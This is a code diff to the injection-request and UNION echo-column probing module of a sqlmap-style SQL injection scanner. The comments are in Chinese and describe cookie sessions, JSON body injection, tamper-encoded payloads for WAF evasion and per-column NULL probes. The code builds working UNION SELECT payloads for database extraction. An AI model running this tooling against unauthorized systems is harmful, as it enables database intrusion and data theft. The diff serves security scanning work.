@@ -1,7 +1,69 @@
 import { URL } from 'url';
 import { fillPayload } from './payloads.js';
 import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';
-import { resolveDbms, resolveFromClause } from './DialectSqlBuilder.js';
+import { resolveDbms, resolveFromClause, commentSuffix } from './DialectSqlBuilder.js';
+// [P0-FIX 2026-09-09] 出口选项同源 + 失败响应结构（见 egressOpts.js 顶部三起事故）
+import { buildEgressOpts, mustRethrowSendError, netFailureResponse } from './egressOpts.js';
+import { unionDebug } from './unionDebug.js';
+
+// [P1 批次 2026-09-08] JSON 点路径段 → 真实键匹配（buildInjectionRequest JSON 分支用）。
+// 三向匹配（与 TargetParser._discoverJsonLeaves 的路径生成互逆）：
+//   ① 段为带引号形式（"a.b"）→ JSON.parse 去引号得真实键再命中；
+//   ② 直接属性命中；
+//   ③ 段为裸键但对象键含点号 → JSON.stringify 形式回退匹配。
+// 返回真实键名或 null（无匹配，注入路径失效）。
+function _matchJsonKey(obj, seg) {
+  if (obj == null || typeof obj !== 'object') return null;
+  // ① 段已是引号形式：去引号解析（JSON 字符串字面量），用解析结果命中真实键
+  if (seg.length > 1 && seg[0] === '"' && seg[seg.length - 1] === '"') {
+    try {
+      const unquoted = JSON.parse(seg);
+      if (typeof unquoted === 'string' && Object.prototype.hasOwnProperty.call(obj, unquoted)) return unquoted;
+    } catch { /* 非法 JSON 字面量：走后续分支 */ }
+  }
+  // ② 直接属性命中
+  if (Object.prototype.hasOwnProperty.call(obj, seg)) return seg;
+  // ③ stringify 形式回退（对象键本身带引号存储的边缘场景）
+  const quoted = JSON.stringify(seg);
+  if (quoted.length > 2 && Object.prototype.hasOwnProperty.call(obj, quoted)) return quoted;
+  return null;
+}
+
+// [P1 批次 2026-09-08] 引号感知的点路径拆分：普通段用 '.' 分隔，但 "带引号" 段（键本身
+// 含点号，TargetParser 生成时用 JSON.stringify 包裹）作为整体不拆。例：
+// `user."a.b".id` → ['user', '"a.b"', 'id']（而非 ['user', '"a', 'b"', 'id']）。
+// 与 _discoverJsonLeaves 的路径生成规则互逆；数组下标段为裸数字。
+function _splitJsonPath(path) {
+  const segs = [];
+  let i = 0;
+  const s = String(path ?? '');
+  while (i < s.length) {
+    if (s[i] === '"') {
+      // 引号段：找到闭合引号（键内的转义引号按 JSON 语义简化处理——扫描到下一个
+      // 未被反斜杠转义的引号）
+      let j = i + 1;
+      while (j < s.length) {
+        if (s[j] === '\\') { j += 2; continue; }
+        if (s[j] === '"') break;
+        j++;
+      }
+      if (j >= s.length) return null; // 引号未闭合：非法路径
+      segs.push(s.slice(i, j + 1));
+      i = j + 1;
+      if (s[i] === '.') i++;
+      else if (i < s.length) return null; // 引号段后必须跟点号或结束
+    } else {
+      // 普通段：到下一个点号（跳过引号内的点号）
+      let j = i;
+      while (j < s.length && s[j] !== '.') j++;
+      if (j === i) return null; // 空段（连续点号/首尾点号）：非法
+      segs.push(s.slice(i, j));
+      i = j;
+      if (s[i] === '.') i++;
+    }
+  }
+  return segs.length ? segs : null;
+}
 
 // 读取 target.config 的 prefix/suffix（对标 sqlmap --prefix / --suffix），
 // 包裹「被注入的参数值」：最终注入值 = prefix + 原值 + payload + suffix。
@@ -37,10 +99,46 @@ export function buildInjectionRequest(target, point, value) {
     headers: { ...(target.headerParams || {}) },
   };
   const cookies = { ...(target.cookieParams || {}) };
+  // [P0-FIX 2026-09-07] cookieParams = 会话上下文，必须无条件携带到所有 HTTP 注入点的
+  // 请求上——登录后才可见的后台/用户中心是注入重灾区，此前仅 cookie 注入点分支会写
+  // Cookie 头，url/body/header 注入点的请求全部裸奔（实测 80 请求 0 个带 sid，
+  // 基线标题「未登录」，还在未登录页上测出 boolean 假阳性）。
+  // 语义解耦：cookieParams（会话携带，无条件）≠ cookie 注入点（测试目标，level≥2）。
+  // 优先级：用户显式 headerParams.Cookie（如 --cookie= 手工指定）> cookieParams 自动会话，
+  // 与 HttpClient 的「显式头优先，jar 同名不覆盖」规则一致。
+  if (
+    Object.keys(cookies).length > 0 &&
+    !req.headers['Cookie'] && !req.headers['cookie']
+  ) {
+    req.headers['Cookie'] = Object.entries(cookies)
+      .map(([k, v]) => `${k}=${v}`)
+      .join('; ');
+  }
   if (point.location === 'url') {
     const u = new URL(req.url);
-    u.searchParams.set(point.param, injected);
-    req.url = u.toString();
+    // [P0-FIX 2026-09-06] 已编码 payload 跳过二次编码：charencode/chardoubleencode 类
+    // tamper 的输出本身就是 URL 编码形态，searchParams.set 会把 % 再编码为 %25（双重编码）
+    // → 服务器单次解码后 payload 仍是编码形态 → SQL 层收到乱码、回显标记失配
+    // （waf-lab configB 0 检出的根因）。判定：含合法 %XX 且解码后形态改变 → 视为已编码。
+    // 误判面：LIKE '%a%' 等含裸 % 的值解码会失败或不变 → 不触发 preEncoded 分支。
+    const looksEncoded = /%[0-9A-Fa-f]{2}/.test(injected);
+    let preEncoded = false;
+    if (looksEncoded) {
+      try {
+        preEncoded = decodeURIComponent(injected) !== injected;
+      } catch {
+        preEncoded = false; // 非法序列（如 '%a%'）→ 未编码
+      }
+    }
+    if (preEncoded) {
+      // 手工拼 query：先移除同名旧参数，injected 已是编码形态仅编码参数名
+      u.searchParams.delete(point.param);
+      const rest = u.searchParams.toString();
+      req.url = `${u.origin}${u.pathname}?${rest ? rest + '&' : ''}${encodeURIComponent(point.param)}=${injected}`;
+    } else {
+      u.searchParams.set(point.param, injected);
+      req.url = u.toString();
+    }
   } else if (point.location === 'path') {
     // P3 路径注入点：按 pathSegment 下标替换 URL 路径中的标记段（URL 构造器自动做路径编码）
     const u = new URL(req.url);
@@ -60,6 +158,39 @@ export function buildInjectionRequest(target, point, value) {
     const formValues = point.formValues || {};
     req.data = { ...formValues };
     req.data[point.param] = injected;
+    // [P1 批次 2026-09-08] JSON body 嵌套注入点（param 为点路径如 user.id）：
+    // target.jsonBody 存在时按路径替换叶子值为注入值后整体重序列化为 JSON 字符串
+    // （Content-Type 设 application/json——HttpClient 对字符串 data 直发不覆盖）。
+    // 点路径按段替换：段为纯数字走数组下标，否则走对象键（键含点号时用 JSON.stringify
+    // 形式匹配，与 TargetParser._discoverJsonLeaves 的路径生成规则互逆）。
+    if (target.jsonBody != null && typeof target.jsonBody === 'object' && point.param.includes('.')) {
+      const clone = JSON.parse(JSON.stringify(target.jsonBody));
+      // [P1 批次 2026-09-08] 引号感知路径解析：键含点号时 TargetParser 生成 "a.b" 形式段，
+      // 暴力 split('.') 会切碎——_splitJsonPath 把带引号段作为整体解析（互逆规则）。
+      const segs = _splitJsonPath(point.param);
+      let cur = clone;
+      let ok = true;
+      if (!segs) {
+        ok = false; // 非法路径（引号未闭合/空段）：JSON 注入失效，保持表单语义
+      }
+      for (let i = 0; ok && i < segs.length - 1; i++) {
+        const raw = segs[i];
+        const num = /^\d+$/.test(raw) ? Number(raw) : null;
+        const key = num !== null ? num : _matchJsonKey(cur, raw);
+        if (key === null || cur[key] == null || typeof cur[key] !== 'object') { ok = false; break; }
+        cur = cur[key];
+      }
+      if (ok) {
+        const leaf = segs[segs.length - 1];
+        const leafNum = /^\d+$/.test(leaf) ? Number(leaf) : null;
+        const leafKey = leafNum !== null ? leafNum : _matchJsonKey(cur, leaf);
+        if (leafKey !== null) {
+          cur[leafKey] = injected;
+          req.data = JSON.stringify(clone);
+          req.headers['Content-Type'] = 'application/json';
+        }
+      }
+    }
   } else if (point.location === 'cookie') {
     cookies[point.param] = injected;
     req.headers['Cookie'] = Object.entries(cookies)
@@ -80,25 +211,44 @@ export function buildInjectionRequest(target, point, value) {
   return req;
 }
 
-// 经统一 HttpClient 发送（失败返回 null，不让单请求错误中断提取/指纹）
+// 经统一 HttpClient 发送。
+// [P0-FIX 2026-09-09] 失败不再吞成 null：网络层失败降级为带 `__netErr` 的**失败响应对象**
+// （status 0 / data 空串，`res?.status`、`String(res?.data ?? '')` 语义不变，零回归），
+// 于是判定层能区分「目标返回空页」与「一个包都没发出去」—— 前者可以下结论，后者不行。
+// 两类例外必须继续抛出：扫描停止（Abort）与安全硬拒（SSRF / scope 越界 / URL 非法）——
+// 把「越界」写成「这个点没洞」是最坏的失败方式。
 export async function sendInjection(httpClient, ctx, req, opts = {}) {
   const config = (ctx && ctx.config) || {};
   try {
-    return await httpClient.request({
-      method: req.method,
-      url: req.url,
-      params: req.params,
-      data: req.data,
-      headers: req.headers,
-      sql: req.sql,
-      timeoutMs: opts.timeoutMs ?? config.timeoutMs,
-      retry: opts.retry ?? config.retry,
-      proxy: config.proxy ?? false,
-      auth: config.auth ?? null,
-      wafEvasion: config.wafEvasion ?? null,
-    });
-  } catch {
-    return null;
+    const res = await httpClient.request(
+      // 出口选项与 Detector.send / Detector.sendHead 同源（见 egressOpts.js 顶部三起事故）
+      buildEgressOpts(config, {
+        method: req.method,
+        url: req.url,
+        params: req.params,
+        data: req.data,
+        headers: req.headers,
+        sql: req.sql,
+        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
+        retry: opts.retry ?? config.retry,
+      })
+    );
+    // 目标库健康回流（提取/指纹阶段的请求同样可能触发 DB 致命错误）
+    try {
+      ctx?.guard?.observe(res);
+    } catch {
+      /* 守卫异常不影响主流程 */
+    }
+    return res;
+  } catch (err) {
+    if (mustRethrowSendError(err)) throw err;
+    const failed = netFailureResponse(err, { url: req.url });
+    try {
+      ctx?.guard?.observe(failed);
+    } catch {
+      /* 守卫异常不影响主流程 */
+    }
+    return failed;
   }
 }
 
@@ -118,12 +268,16 @@ const MARKER = 'SQLISCANNER';
 const NUM_MARKER_BASE_A = 7331000;
 const NUM_MARKER_BASE_B = 5182960;
 
-// 构造一次标记 UNION 探测请求（boundary 由调用方传入：检测器带闭合前缀，提取/指纹不带）
+// 构造一次标记 UNION 探测请求（boundary 由调用方传入；缺省回落到 point.boundary）
+// [CRS-FIX 2026-09-10] 末尾必须带行注释：否则字符串型注入点残留的闭合引号无法被注释掉
+// → 整条 SQL 语法错误 → 探测恒 500（实测 /str、/like 的 UNION 回显列定位 100% 失败）。
 function _markerProbe(ctx, columns, markerExprs, boundary, fromClause = '') {
   const { target, point } = ctx;
-  const payload = fillPayload('{ORIG} UNION SELECT {MARKERS}', {
-    orig: `${point.originalValue || '1'}${boundary}`,
-  }).replace('{MARKERS}', markerExprs.join(',')) + fromClause;
+  const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
+  const payload =
+    fillPayload('{ORIG} UNION SELECT {MARKERS}', {
+      orig: `${point.originalValue || '1'}${boundary}`,
+    }).replace('{MARKERS}', markerExprs.join(',')) + fromClause + suffix;
   return { payload, req: buildInjectionRequest(target, point, obfuscateIfNeeded(ctx, payload)) };
 }
 
@@ -137,30 +291,106 @@ function _numMarkers(base, columns) {
 
 async function _probeBody(httpClient, ctx, probe) {
   const res = await sendInjection(httpClient, ctx, probe.req);
-  return String(res?.data ?? '');
+  const status = res?.status ?? null;
+  return {
+    body: String(res?.data ?? ''),
+    status,
+    // [P0-FIX 2026-09-07] 标记命中必须发生在非错误响应上：PG 严格类型下 UNION 类型错配的
+    // 500 错误页会把「转换失败的输入值」原样回显（invalid input syntax for type integer:
+    // "SQLISCANNER0"）——按纯文本匹配会把报错回显误判为可回显列（实测 echoCols 被污染成
+    // int 列 [0] → 拖库把文本表达式放 int 列 → 提取全线 500）。
+    echoed: status != null && status >= 200 && status < 400,
+  };
 }
 
-// 用给定的 fromClause 做一轮完整回显列探测（text → numeric A → B 交叉确认）。
+// 用给定的 fromClause 做一轮完整回显列探测（text → 逐列 text → numeric A → B 交叉确认）。
 // 提取为独立函数以支持「DBMS 已知时用对应 FROM 子句、未知时先空再 FROM dual 兜底」两轮复用。
 async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause) {
+  // 与 _markerProbe 同一判据：证据 payload 必须与实际发出的探测逐字节一致
+  const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
   const textProbe = _markerProbe(ctx, columns, _textMarkers(columns), boundary, fromClause);
-  const body = await _probeBody(httpClient, ctx, textProbe);
-  const lower = body.toLowerCase();
-  const cols = [];
-  for (let i = 0; i < columns; i++) {
-    // 大小写不敏感匹配：randomcase 等 tamper 会打乱回显标记的大小写
-    if (lower.includes(`${MARKER}${i}`.toLowerCase())) cols.push(i);
+  const textRes = await _probeBody(httpClient, ctx, textProbe);
+  unionDebug(
+    `probe columns=${columns} status=${textRes.status} echoed=${textRes.echoed} ` +
+      `len=${textRes.body.length} payload=${String(textProbe.payload).slice(0, 90)}`,
+  );
+  if (textRes.echoed) {
+    const lower = textRes.body.toLowerCase();
+    const cols = [];
+    for (let i = 0; i < columns; i++) {
+      // 大小写不敏感匹配：randomcase 等 tamper 会打乱回显标记的大小写
+      if (lower.includes(`${MARKER}${i}`.toLowerCase())) cols.push(i);
+    }
+    if (cols.length > 0) {
+      return { cols, numericCols: [], style: 'text', evidencePayload: textProbe.payload };
+    }
   }
-  if (cols.length > 0) {
-    return { cols, numericCols: [], style: 'text', evidencePayload: textProbe.payload };
+
+  // [CRS-FIX 2026-09-10] 全 NULL 哨兵：列数不匹配时的短路。
+  // 走到这里说明「全列文本标记」探测失败，失败原因有两种，处置截然不同：
+  //   ① 列数猜错（ORDER BY 二分收敛到错的 N）→ 任何 UNION 都报 "different number of
+  //      columns" → 后续 N 条逐列探测 + 2 条数字族探测**必然全失败**；
+  //   ② 严格类型库（PG/MSSQL/Oracle）某列为 INT，文本标记触类型错误 → 逐列探测正是为它
+  //      设计的（单列标记 + 其余 NULL），必须继续。
+  // 区分判据：发一条「全 NULL」UNION（不放置任何标记）。NULL 与任何列类型都兼容，
+  // 故 ② 下必然成功、① 下必然失败。成本 +1 条请求，可省下 N+2 条（实测 N=50 时省 51 条）。
+  // 且仅在「全列标记已失败」的分支执行，成功路径（MySQL/SQLite 一轮命中）零额外开销。
+  if (!textRes.echoed) {
+    const nullSentinel = _markerProbe(ctx, columns, Array.from({ length: columns }, () => 'NULL'), boundary, fromClause);
+    const sentinelRes = await _probeBody(httpClient, ctx, nullSentinel);
+    if (!sentinelRes.echoed) {
+      unionDebug(
+        `probe sentinel-fail columns=${columns} status=${sentinelRes.status} ` +
+          `→ 结构性失败（列数不匹配或语法错误），跳过 ${columns} 条逐列探测 + 数字族`,
+      );
+      return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
+    }
+  }
+
+  // [P0-FIX 2026-09-07] 逐列文本探测：全列文本标记在严格类型库（PG/MSSQL/Oracle）上
+  // 只要有一列是 INT 就整条 UNION 报错 → 真正的文本回显列（如 username/email）永远
+  // 发现不了。逐列探测「单列放文本标记、其余列全 NULL」——NULL 与任何列类型 UNION
+  // 都合法，因此仅当该列真正可回显文本时才命中。宽松类型库（MySQL/SQLite）第一轮
+  // 已命中，不会走到这里（零额外请求）；严格类型库成本 = 列数 N 个请求（限并发 4）。
+  const perCol = [];
+  const BATCH = 4;
+  for (let start = 0; start < columns; start += BATCH) {
+    const batch = [];
+    for (let i = start; i < Math.min(start + BATCH, columns); i++) {
+      const nulls = Array.from({ length: columns }, () => 'NULL');
+      nulls[i] = `'${MARKER}${i}'`;
+      batch.push(
+        _probeBody(httpClient, ctx, _markerProbe(ctx, columns, nulls, boundary, fromClause)).then((r) => ({ i, ...r }))
+      );
+    }
+    perCol.push(...(await Promise.all(batch)));
+  }
+  const textCols = [];
+  let evidence = textProbe.payload;
+  for (const r of perCol) {
+    if (r.echoed && r.body.toLowerCase().includes(`${MARKER}${r.i}`.toLowerCase())) {
+      textCols.push(r.i);
+      if (textCols.length === 1) {
+        const single = Array.from({ length: columns }, () => 'NULL');
+        single[r.i] = `'${MARKER}${r.i}'`;
+        evidence = fillPayload('{ORIG} UNION SELECT {MARKERS}', {
+          orig: `${ctx.point?.originalValue || '1'}${boundary}`,
+        }).replace('{MARKERS}', single.join(',')) + fromClause + suffix;
+      }
+    }
+  }
+  if (textCols.length > 0) {
+    return { cols: textCols, numericCols: [], style: 'text', evidencePayload: evidence };
   }
 
   // 数字兜底 A 族
   const probeA = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_A, columns), boundary, fromClause);
-  const bodyA = await _probeBody(httpClient, ctx, probeA);
+  const resA = await _probeBody(httpClient, ctx, probeA);
   const hitsA = [];
-  for (let i = 0; i < columns; i++) {
-    if (bodyA.includes(String(NUM_MARKER_BASE_A + i))) hitsA.push(i);
+  if (resA.echoed) {
+    for (let i = 0; i < columns; i++) {
+      if (resA.body.includes(String(NUM_MARKER_BASE_A + i))) hitsA.push(i);
+    }
   }
   if (hitsA.length === 0) {
     return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
@@ -168,8 +398,10 @@ async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClau
 
   // B 族交叉确认（仅保留双族同时命中的列，剔除页面固有数字串假命中）
   const probeB = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_B, columns), boundary, fromClause);
-  const bodyB = await _probeBody(httpClient, ctx, probeB);
-  const numericCols = hitsA.filter((i) => bodyB.includes(String(NUM_MARKER_BASE_B + i)));
+  const resB = await _probeBody(httpClient, ctx, probeB);
+  const numericCols = resB.echoed
+    ? hitsA.filter((i) => resB.body.includes(String(NUM_MARKER_BASE_B + i)))
+    : [];
   if (numericCols.length === 0) {
     return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
   }
@@ -177,15 +409,24 @@ async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClau
 }
 
 // 定位可回显列（详细版）：
-//   ① 文本标记探测（MySQL/SQLite 等宽松类型库一次请求即命中）
-//   ② 落空时数字标记 A 族探测 → 命中后 B 族交叉确认（严格类型库 / INT 回显列兜底）
-//   ③ ★FIX [P0]：DBMS 未知时补一轮 FROM dual 兜底
+//   ① 全列文本标记探测（MySQL/SQLite 等宽松类型库一次请求即命中）
+//   ② 落空时逐列文本探测（严格类型库：单列文本 + 其余 NULL，NULL 与任何类型 UNION 合法，
+//      精确定位真正可回显文本的列——修复「任一 INT 列使全列标记整条报错 → 文本列全漏」）
+//   ③ 数字标记 A 族探测 → 命中后 B 族交叉确认（纯 INT 回显列兜底）
+//   ④ ★FIX [P0]：DBMS 未知时补一轮 FROM dual 兜底
 //      Oracle/DM8/DB2 等方言 SELECT 必须带 FROM 伪表，否则直接报错 → 第一轮全失败。
 //      FROM dual 对 MySQL/Oracle 安全（合法），PG/SQLite/MSSQL 不支持 dual → 报错 → 不误报。
 // 返回 { cols: 文本回显列, numericCols: 数值回显列(已交叉确认), style, evidencePayload }
 //   - cols 语义与旧版 discoverEchoColumns 一致：仅文本可回显列（拖库/版本提取只能走文本列）
 //   - evidencePayload：命中的那次请求 payload（供检测器记录证据）
-export async function discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary = '') {
+//   - 所有标记命中均要求响应为 2xx/3xx：5xx 错误页会回显「转换失败的输入值」，
+//     按纯文本匹配会把报错回显误判为回显列（假命中）。
+// [CRS-FIX 2026-09-10] boundary 缺省回落到 point.boundary。
+// 原默认 '' 使**未显式传参的调用方**（DBFingerprinter 经 discoverEchoColumns）在字符串型
+// 注入点上发出未闭合的 UNION 探测 → 整句落在引号内 → 恒失败 → 指纹的 UNION 版本通道
+// 在 /str、/like、/blind 上 100% 空转。显式传参的 UnionDetector 本就传 point.boundary，
+// 行为不变（数值型注入点 boundary 探测结果就是 ''）。
+export async function discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary = ctx?.point?.boundary || '') {
   if (!(columns > 0)) return { cols: [], numericCols: [], style: 'none', evidencePayload: '' };
 
   // 根据 DBMS 决定 UNION SELECT 的伪表 FROM 子句
